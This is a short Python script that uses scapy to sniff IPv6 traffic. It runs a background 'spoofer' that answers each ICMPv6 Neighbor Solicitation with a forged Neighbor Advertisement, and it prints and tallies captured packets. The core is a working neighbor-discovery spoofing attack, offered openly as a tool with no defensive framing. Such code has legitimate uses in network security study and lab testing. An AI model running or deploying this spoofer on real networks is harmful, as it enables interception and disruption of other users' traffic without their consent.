#! /user/bin/env python3

from scapy.all import *
from .PacketStats import get_statistics, print_stats
from .hexa import print_packet

def response(packet):
    ip_src = packet.getlayer(IPv6).dst
    ip_dst = packet.getlayer(IPv6).src
    mac_dest = packet.getlayer(Ether).dst

    response = Ether(dst=mac_dest)/IPv6(
        tc=0, fl=0, plen=24, nh=58, hlim=255, src=ip_src, dst=ip_dst)/ICMPv6ND_NA(
        type=136, code=0, cksum=35207, R=1, S=1, O=0, res=0, tgt=ip_dst)

    send(response, verbose=0)

def treat_packet(packet):
    print_packet(packet)
    get_statistics(packet)

def main():
    ipv6_filter = lambda pkt: pkt.haslayer(IPv6)
    spoof_filter = lambda pkt: pkt.haslayer(IPv6) and pkt.haslayer(ICMPv6ND_NS)

    spoofer = AsyncSniffer(lfilter = spoof_filter, prn = lambda pkt: response(pkt))
    spoofer.start()

    try:
        sniff(lfilter = ipv6_filter, prn = lambda pkt: treat_packet(pkt))
    except KeyboardInterrupt:
        print("Please wait...")
    finally:
        spoofer.stop()
        print_stats()

if __name__ == "__main__":
    main()
